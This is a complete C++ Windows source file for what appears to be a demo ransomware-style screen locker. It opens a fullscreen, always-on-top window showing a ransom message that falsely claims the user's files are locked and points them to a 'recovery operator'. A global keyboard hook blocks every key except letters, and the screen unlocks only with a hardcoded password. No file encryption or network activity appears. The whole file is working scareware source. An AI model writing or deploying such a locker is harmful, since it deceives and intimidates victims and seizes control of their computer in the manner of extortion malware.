#include <windows.h>
#include <string>
#include <iostream>

#define IDC_EDIT_PASS 1001
#define IDC_BTN_SUBMIT 1002
#define DEMO_PASSWORD "iquit"

const char IMAGE_PATH[] = "ransomware_model\\front_page.bmp";

int screenWidth  = GetSystemMetrics(SM_CXSCREEN);
int screenHeight = GetSystemMetrics(SM_CYSCREEN);

HINSTANCE g_hInst        = NULL;
HWND g_hMessage          = NULL;
HWND g_hImage            = NULL;
HWND g_hInput            = NULL;
HWND g_hButton           = NULL;
HFONT g_hBigFont         = NULL;
HBITMAP g_hBmp           = NULL;
HWND g_hPopup            = NULL;

HHOOK keyboardHook;  // <-- Added

const char* message =
"Your Computer Has Been Affected\n\n"
"All essential files, system configurations, and personal data have been locked "
"and are no longer accessible.\n"
"This action was triggered due to unauthorized access or suspicious activity detected on your device.\n"
"Your system is now under restricted mode, and normal functionality has been disabled.\n\n"
"What does this mean?\n"
"- You cannot access your desktop, documents, or applications.\n"
"- Any attempt to restart, bypass, or terminate this window may result in permanent data loss.\n"
"- Your mouse and keyboard input have been limited for security reasons.\n\n"
"To restore access to your system:\n"
"Contact the recovery operator immediately.\n";


// ---------------- KEYBOARD HOOK -----------------
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT* pKeyboard = (KBDLLHOOKSTRUCT*)lParam;
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            DWORD vkCode = pKeyboard->vkCode;

            // Allow only alphabets (A-Z)
            if (!(vkCode >= 'A' && vkCode <= 'Z')) {
                return 1; // Block everything else
            }
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// ---------------- SMALL POPUP -----------------
void ShowCustomMessageBox(HWND hwnd, LPCSTR text, int x, int y) {
    if (g_hPopup) {
        DestroyWindow(g_hPopup);
        g_hPopup = NULL;
    }

    g_hPopup = CreateWindowExA(
        WS_EX_TOPMOST,
        "STATIC", text,
        WS_POPUP | WS_VISIBLE | SS_CENTER,
        x - 150, y, 300, 40,
        hwnd, NULL, g_hInst, NULL
    );

    if (g_hBigFont) {
        SendMessageA(g_hPopup, WM_SETFONT, (WPARAM)g_hBigFont, TRUE);
    }

    SetWindowLongPtr(g_hPopup, GWLP_WNDPROC, (LONG_PTR)+[](HWND h, UINT m, WPARAM w, LPARAM l) -> LRESULT {
        switch (m) {
        case WM_CTLCOLORSTATIC: {
            HDC hdc = (HDC)w;
            SetTextColor(hdc, RGB(255, 0, 0));
            SetBkColor(hdc, RGB(0, 0, 0));
            static HBRUSH hBrush = CreateSolidBrush(RGB(0, 0, 0));
            return (LRESULT)hBrush;
        }}
        return DefWindowProc(h, m, w, l);
    });

    SetTimer(hwnd, 1, 2000, NULL);
}

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    switch (uMsg) {
    case WM_CREATE: {
        int imgW = screenWidth / 2;
        int imgH = screenHeight;

        g_hImage = CreateWindowExA(
            0, "STATIC", NULL,
            WS_CHILD | WS_VISIBLE | SS_BITMAP,
            0, 0, imgW, imgH,
            hwnd, NULL, g_hInst, NULL
        );

        int contentX = imgW + 20;
        int contentW = screenWidth - contentX - 20;

        g_hMessage = CreateWindowExA(
            0, "STATIC", message,
            WS_CHILD | WS_VISIBLE | SS_LEFT,
            contentX, 30, contentW, screenHeight - 200,
            hwnd, NULL, g_hInst, NULL
        );

        int editY = screenHeight - 140;
        g_hInput = CreateWindowExA(
            WS_EX_CLIENTEDGE, "EDIT", "",
            WS_CHILD | WS_VISIBLE | ES_LEFT | ES_AUTOHSCROLL | ES_PASSWORD,
            contentX, editY, 300, 30,
            hwnd, (HMENU)IDC_EDIT_PASS, g_hInst, NULL
        );

        g_hButton = CreateWindowExA(
            0, "BUTTON", "Submit",
            WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
            contentX + 310, editY, 100, 30,
            hwnd, (HMENU)IDC_BTN_SUBMIT, g_hInst, NULL
        );

        HDC hdc = GetDC(hwnd);
        int pixelHeight = -MulDiv(15, GetDeviceCaps(hdc, LOGPIXELSY), 72);
        ReleaseDC(hwnd, hdc);

        g_hBigFont = CreateFontA(
            pixelHeight, 0, 0, 0,
            FW_NORMAL, FALSE, FALSE, FALSE,
            DEFAULT_CHARSET, OUT_DEFAULT_PRECIS,
            CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY,
            VARIABLE_PITCH | FF_SWISS, "Segoe UI"
        );

        if (g_hBigFont) {
            SendMessageA(g_hMessage, WM_SETFONT, (WPARAM)g_hBigFont, TRUE);
            SendMessageA(g_hInput, WM_SETFONT, (WPARAM)g_hBigFont, TRUE);
            SendMessageA(g_hButton, WM_SETFONT, (WPARAM)g_hBigFont, TRUE);
        }

        g_hBmp = (HBITMAP)LoadImageA(NULL, IMAGE_PATH, IMAGE_BITMAP, 0, 0, LR_LOADFROMFILE);
        if (g_hBmp)
            SendMessageA(g_hImage, STM_SETIMAGE, (WPARAM)IMAGE_BITMAP, (LPARAM)g_hBmp);
        else
            SetWindowTextA(g_hImage, "Image not found.\nUpdate IMAGE_PATH.");
        return 0;
    }

    case WM_COMMAND:
        if (LOWORD(wParam) == IDC_BTN_SUBMIT) {
            char buffer[256];
            GetWindowTextA(g_hInput, buffer, sizeof(buffer));

            RECT btnRect;
            GetWindowRect(g_hButton, &btnRect);

            if (strcmp(buffer, DEMO_PASSWORD) == 0) {
                ShowCustomMessageBox(hwnd, "Unlocked — Thank you!", btnRect.left, btnRect.bottom + 10);
                PostQuitMessage(0);
            } else {
                ShowCustomMessageBox(hwnd, "Wrong Password!", btnRect.left, btnRect.bottom + 10);
                SetWindowTextA(g_hInput, "");
            }
        }
        break;

    case WM_CTLCOLORSTATIC: {
        HDC hdcStatic = (HDC)wParam;
        SetTextColor(hdcStatic, RGB(255, 0, 0));
        SetBkMode(hdcStatic, TRANSPARENT);
        return (LRESULT)GetStockObject(BLACK_BRUSH);
    }

    case WM_CTLCOLOREDIT: {
        HDC hdcEdit = (HDC)wParam;
        SetTextColor(hdcEdit, RGB(255, 0, 0));
        SetBkMode(hdcEdit, OPAQUE);
        SetBkColor(hdcEdit, RGB(0, 0, 0));
        static HBRUSH hBlackBrush2 = CreateSolidBrush(RGB(0, 0, 0));
        return (LRESULT)hBlackBrush2;
    }

    case WM_TIMER:
        if (wParam == 1 && g_hPopup) {
            DestroyWindow(g_hPopup);
            g_hPopup = NULL;
            KillTimer(hwnd, 1);
        }
        break;

    case WM_DESTROY:
        if (g_hPopup) DestroyWindow(g_hPopup);
        if (g_hBmp) DeleteObject(g_hBmp);
        if (g_hBigFont) DeleteObject(g_hBigFont);
        if (keyboardHook) UnhookWindowsHookEx(keyboardHook);
        PostQuitMessage(0);
        return 0;
    }
    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR, int) {
    g_hInst = hInstance;
    const char CLASS_NAME[] = "KioskFullscreen";

    WNDCLASSA wc = {};
    wc.lpfnWndProc   = WindowProc;
    wc.hInstance     = g_hInst;
    wc.lpszClassName = CLASS_NAME;
    wc.hbrBackground = CreateSolidBrush(RGB(0, 0, 0));
    wc.hCursor       = LoadCursor(NULL, IDC_ARROW);
    RegisterClassA(&wc);

    HWND hwnd = CreateWindowExA(
        WS_EX_TOPMOST, CLASS_NAME, "Kiosk Fullscreen",
        WS_POPUP, 0, 0, screenWidth, screenHeight,
        NULL, NULL, g_hInst, NULL
    );

    if (!hwnd) return 0;

    // Install global keyboard hook (IMPORTANT)
    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);

    ShowWindow(hwnd, SW_SHOWDEFAULT);
    UpdateWindow(hwnd);

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return 0;
}
